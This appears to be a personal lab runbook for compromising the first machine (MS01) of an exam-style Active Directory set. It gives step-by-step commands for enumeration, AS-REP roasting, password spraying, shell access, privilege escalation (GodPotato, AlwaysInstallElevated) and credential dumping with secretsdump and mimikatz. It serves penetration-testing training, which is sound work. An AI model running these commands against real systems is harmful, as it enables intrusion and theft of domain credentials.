# 🖥️ MS01 — Initial Foothold

> Machine command playbook for **MS01**, the first foothold of the AD set. Steps mirror your Landscape checklist (22 tasks) in run order. **Nothing here is pre-filled by design** — replace every `<…>` with your verified value and paste real output / screenshots where marked. Never record a guessed IP, cred, or output.

Part of [[Active Directory]]. Attack path: **MS01 → [[MS02 — Lateral Movement|MS02]] → [[DC01 — Domain Controller|DC01]]** · overview: [[AD Attack Path — MS01 to DC01]].

---

## 🎯 VERIFIED ENVIRONMENT (fill from your lab)
| Field | Value |
|---|---|
| IP | `<MS01_IP>` |
| Hostname | `<MS01_HOST>` |
| Domain (FQDN) | `<DOMAIN>` |
| OS / build | `<from nmap / smb-os-discovery>` |
| Foothold cred | `<user>:<pass>` or `<user>:<NThash>` |
| Local-admin? | `<yes/no — Pwn3d! in netexec>` |
| local.txt | `<flag>` |

```bash
# set once, reuse everywhere below
export IP=<MS01_IP> DOMAIN=<domain.tld> U=<user> P='<pass>'
```
```bash
# AD hygiene: name resolution + clock (or Kerberos breaks later)
echo "$IP <MS01_HOST>.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts ; sudo ntpdate $IP
```
> Links to the generic how-to live in [[SMB]], [[LDAP]], [[Kerberos]], [[Windows Privilege Escalation]], [[Credential Attacks]]. This note is the **per-machine runbook**; those are the reference.

---

## 🔎 RECON

### 1. Scan all TCP ports — `Recon`
```bash
sudo nmap -sC -sV -p- --min-rate 5000 $IP -oN nmap/ms01-tcp.txt
```
- **Does:** full 65535-port TCP sweep with versions + default scripts.
- **Look for:** 445/139 ([[SMB]]), 88/389/636/3268 (domain → [[Kerberos]]/[[LDAP]]), 5985 ([[WinRM]]), 1433 ([[MSSQL]]), 3389 ([[RDP]]).
- **Next:** feed the open ports into the Enum block.
- `# ← paste open-port list` · evidence `![[ms01-01-nmap-tcp.png]]`

### 2. Scan UDP top ports (88, 53, 161) — `Recon`
```bash
sudo nmap -sU -p88,53,161 -sV $IP -oN nmap/ms01-udp.txt
```
- **Does:** checks Kerberos(88)/DNS(53)/[[SNMP]](161) which TCP scans miss.
- **Look for:** 161 open → SNMP community strings (users/creds); 88/53 reinforce "this is a DC".
- `# ← paste output` · `![[ms01-02-udp.png]]`

### 3. Identify domain name from SMB/LDAP banners — `Recon`
```bash
netexec smb $IP
```
```bash
ldapsearch -x -H ldap://$IP -s base namingContexts
```
- **Does:** `netexec smb` prints hostname + **domain**; `namingContexts` gives the **Base DN** (`DC=…,DC=…`).
- **Look for:** the domain FQDN → set `$DOMAIN`, re-add `/etc/hosts`, note `<BASE_DN>`.
- **Next:** everything below uses `$DOMAIN` / `<BASE_DN>`.
- `# ← record DOMAIN + BASE_DN` · `![[ms01-03-domain.png]]`

---

## 🔍 ENUM

### 4. Anonymous SMB access — `Enum`
```bash
smbclient -N -L //$IP/
```
```bash
smbmap -H $IP           # READ/WRITE column at a glance
```
```bash
netexec smb $IP -u '' -p '' --shares
```
- **Look for:** any share **not** `ADMIN$/C$/IPC$` returning without error; a `READ`/`WRITE` perm.
- **Next:** readable share → step 7; writable share → note for a payload drop.
- `# ← paste share list + perms` · `![[ms01-04-smb-shares.png]]`

### 5. Null LDAP session — `Enum`
```bash
ldapsearch -x -H ldap://$IP -b "<BASE_DN>" > loot/ms01-ldap.txt
```
```bash
grep -iE 'sAMAccountName|description' loot/ms01-ldap.txt
```
- **Look for:** a **password in a `description`/`info` field**; `sAMAccountName` values → `users.txt`.
- **Next:** any cred found → step 10/11; usernames → step 9.
- `# ← paste interesting attrs` · `![[ms01-05-ldap.png]]`

### 6. RID brute force for usernames — `Enum`
```bash
rpcclient -U "" -N $IP -c "enumdomusers;querydominfo;getdompwinfo"
```
```bash
netexec smb $IP -u '' -p '' --rid-brute
```
- **Does:** walks SIDs → usernames even when `enumdomusers` is blocked; `getdompwinfo` = **lockout policy** (read it *before* spraying).
- **Look for:** usernames → append to `users.txt`; lockout threshold.
- `# ← paste users + lockout threshold` · `![[ms01-06-rid.png]]`

### 7. Enumerate SMB shares for creds/scripts — `Enum`
```bash
smbmap -H $IP -R                                   # or authenticated: -u $U -p $P -R
```
```bash
sudo mount -t cifs //$IP/<Share> /mnt/ms01 -o username=<u>,password=<p>
```
```bash
grep -riE 'password|pwd|secret|cred|connectionstring' /mnt/ms01
```
- **Look for:** `web.config`, `unattend.xml`, `*.ps1`/`*.bat` (hardcoded creds), `*.kdbx`, backups.
- **Next:** cred found → step 10/11; feeds [[Credential Attacks]].
- `# ← paste creds/paths` · `![[ms01-07-share-loot.png]]`

### 8. Check SYSVOL / NETLOGON for passwords — `Enum`
```bash
# usually needs any valid domain cred:
netexec smb $IP -u $U -p $P -M gpp_password
```
```bash
gpp-decrypt <cpassword>      # if a Groups.xml cpassword is found
```
- **Look for:** GPP `cpassword` in `SYSVOL` → fixed-key AES → **instant plaintext** domain cred.
- `# ← paste decrypted cred (if any)` · `![[ms01-08-gpp.png]]`

---

## 🗡️ ATTACK

### 9. AS-REP roast collected usernames — `Attack`
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP -format hashcat -outputfile loot/asrep.txt
```
```bash
hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt
```
- **Does:** needs **no creds** — any user with pre-auth disabled yields a crackable `$krb5asrep$`. See [[AS-REP Roasting]].
- **Look for:** `$krb5asrep$23$user@DOMAIN…` → crack → a real cred.
- `# ← paste hash / cracked cred` · `![[ms01-09-asrep.png]]`

### 10. Try default / weak creds across protocols — `Attack`
```bash
netexec smb $IP -u <user> -p <pass>            # + winrm / mssql / rdp / ldap
```
- **Look for:** `[+]` (valid) or `(Pwn3d!)` (local admin). Try app-default creds, `username:username`.
- `# ← record which creds validate where` · `![[ms01-10-defaultcreds.png]]`

### 11. Spray creds on SMB/WinRM/RDP/MSSQL/RPC — `Attack`
```bash
# CHECK LOCKOUT FIRST (step 6). One password, many users:
netexec smb $IP -u users.txt -p '<Password>' --continue-on-success
```
```bash
netexec winrm $IP -u users.txt -p '<Password>' ; netexec mssql $IP -u users.txt -p '<Password>'
```
- **Look for:** `[+]`/`(Pwn3d!)`. See [[Password Spraying]].
- **Next:** a `(Pwn3d!)` cred → step 12.
- `# ← record validated cred + where it is admin` · `![[ms01-11-spray.png]]`

---

## 🚪 ACCESS

### 12. Gain foothold shell — `Access`
```bash
evil-winrm -i $IP -u $U -p $P                  # non-admin shell ok (Remote Mgmt Users)
```
```bash
impacket-psexec $DOMAIN/$U:'$P'@$IP            # SYSTEM if (Pwn3d!)
```
```bash
xfreerdp /u:$U /p:$P /v:$IP /cert:ignore
```
- **Next:** got a shell → PrivEsc block. See [[WinRM]] / [[AD Lateral Movement]].
- `# ← record shell method + context (whoami)` · `![[ms01-12-shell.png]]`

---

## 🧗 PRIVESC

### 13. `whoami /priv` — note SeImpersonate/SeBackup — `PrivEsc`
```cmd
whoami /priv
```
- **Look for:** `SeImpersonatePrivilege` Enabled → step 18; `SeBackup/SeRestore` → [[Windows Special Privileges]].
- `# ← paste priv list` · `![[ms01-13-whoami-priv.png]]`

### 14. `systeminfo`, `net user`, `net localgroup` — `PrivEsc`
```cmd
systeminfo & net user & net localgroup administrators
```
- **Look for:** OS build + hotfixes (feed WES-NG), local accounts, admins group members.
- `# ← paste build + users` · `![[ms01-14-systeminfo.png]]`

### 15. Run WinPEAS / PowerUp — save output — `PrivEsc`
```powershell
.\winPEASx64.exe > winpeas.txt
```
```powershell
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```
- **Look for:** flagged services, creds, AlwaysInstallElevated, unquoted paths → [[Windows Privilege Escalation]].
- `# ← paste PEAS highlights` · `![[ms01-15-winpeas.png]]`

### 16. Unquoted service paths / weak perms — `PrivEsc`
```cmd
wmic service get name,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
```
- **Look for:** a service path with spaces + a writable dir, or `SERVICE_CHANGE_CONFIG` → [[Windows Service Exploits]].
- `# ← paste candidate service` · `![[ms01-16-services.png]]`

### 17. Check AlwaysInstallElevated — `PrivEsc`
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- **Look for:** **both** `0x1` → malicious MSI → SYSTEM ([[AlwaysInstallElevated]]).
- `# ← paste both values` · `![[ms01-17-aie.png]]`

### 18. Token impersonation (GodPotato) if SeImpersonate — `PrivEsc`
```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
```
- **Does:** `SeImpersonate` → SYSTEM ([[Token Privileges & Potato]]). Transfer via [[File Transfer]].
- `# ← paste "nt authority\system"` · `![[ms01-18-godpotato.png]]`

---

## 🔑 CREDS

### 19. Grab local SAM / SYSTEM hashes — `Creds`
```cmd
reg save HKLM\SAM C:\Windows\Temp\sam & reg save HKLM\SYSTEM C:\Windows\Temp\system
```
```bash
impacket-secretsdump -sam sam -system system LOCAL
```
- **Look for:** local **Administrator NT hash** → PtH to MS02 ([[Pass-the-Hash]], [[Dumping Windows Hashes]]).
- `# ← paste local hashes (loot)` · `![[ms01-19-sam.png]]`

### 20. Mimikatz `sekurlsa::logonpasswords` — `Creds`
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
- **Look for:** cleartext / NT hashes / Kerberos tickets of logged-on users → **domain** creds to pivot.
- `# ← paste harvested domain creds` · `![[ms01-20-mimikatz.png]]`

---

## 🏰 AD

### 21. Run BloodHound (SharpHound) collection — `AD`
```powershell
.\SharpHound.exe -c All -d $DOMAIN
```
```bash
# or remote from Kali with any domain cred:
bloodhound-python -u $U -p $P -d $DOMAIN -dc <DC_HOST>.$DOMAIN -c all -ns <DC_IP>
```
- **Does:** maps the graph → shortest path to DA; **mark MS01's user owned**. See [[BloodHound]].
- **Next:** the path names MS02/DC01 targets → carry creds to [[MS02 — Lateral Movement]].
- `# ← note path to DA + next host` · `![[ms01-21-bloodhound.png]]`

---

## 🏁 PROOF

### 22. Grab proof.txt / local.txt — `Proof`
```cmd
type C:\Users\<user>\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
```
- **Do:** screenshot the flag **with** `ipconfig` (target IP) + `whoami` in frame ([[Exam Workflow]]).
- `# ← record flags` · `![[ms01-22-proof.png]]`

---

## ➡️ HANDOFF TO MS02
Carry forward to [[MS02 — Lateral Movement]]: **every** cred/hash from steps 7–11, 19–20, and the **BloodHound path** from 21. The AD set is one network — reuse MS01's loot against MS02 before anything else ([[Credential Reuse]]).

## 🧩 EVIDENCE INDEX (drop PNGs in `99 - Attachments/`)
`ms01-01-nmap-tcp` · `…-03-domain` · `…-04-smb-shares` · `…-09-asrep` · `…-11-spray` · `…-12-shell` · `…-13-whoami-priv` · `…-18-godpotato` · `…-19-sam` · `…-20-mimikatz` · `…-21-bloodhound` · `…-22-proof` (add the rest as you capture them).
